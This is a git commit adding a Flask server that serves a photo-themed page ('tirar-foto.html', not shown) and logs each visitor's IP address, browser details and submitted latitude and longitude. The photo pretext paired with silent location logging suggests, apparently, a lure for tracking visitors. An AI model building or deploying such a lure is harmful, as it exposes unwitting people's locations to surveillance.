be61055a797654c2f6a795e68ff5f09446c07c31
João Paulo Morais <110700362+jppcrn@users.noreply.github.com>
2026-02-14 11:08:41 -0300

    teste

---
+++ app.py
@@ -0,0 +1,46 @@
+from flask import Flask, send_from_directory, request, jsonify
+import os
+from datetime import datetime
+
+app = Flask(__name__)
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+@app.route('/')
+def index():
+    return send_from_directory(BASE_DIR, 'tirar-foto.html')
+
+
+@app.route('/log', methods=['POST'])
+def log_data():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    data = request.get_json()
+
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+
+    agora = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    print("\n===== NOVO ACESSO =====")
+    print("Data/Hora:", agora)
+    print("IP:", ip)
+    print("User-Agent:", user_agent)
+    print("Latitude:", latitude)
+    print("Longitude:", longitude)
+    print("=======================\n")
+
+    return jsonify({
+        "status": "ok",
+        "data_hora": agora,
+        "ip": ip,
+        "user_agent": user_agent,
+        "latitude": latitude,
+        "longitude": longitude
+    }), 200
+
+
+if __name__ == '__main__':
+    print("Servidor rodando...")
+    app.run(host='0.0.0.0', port=5000)
+
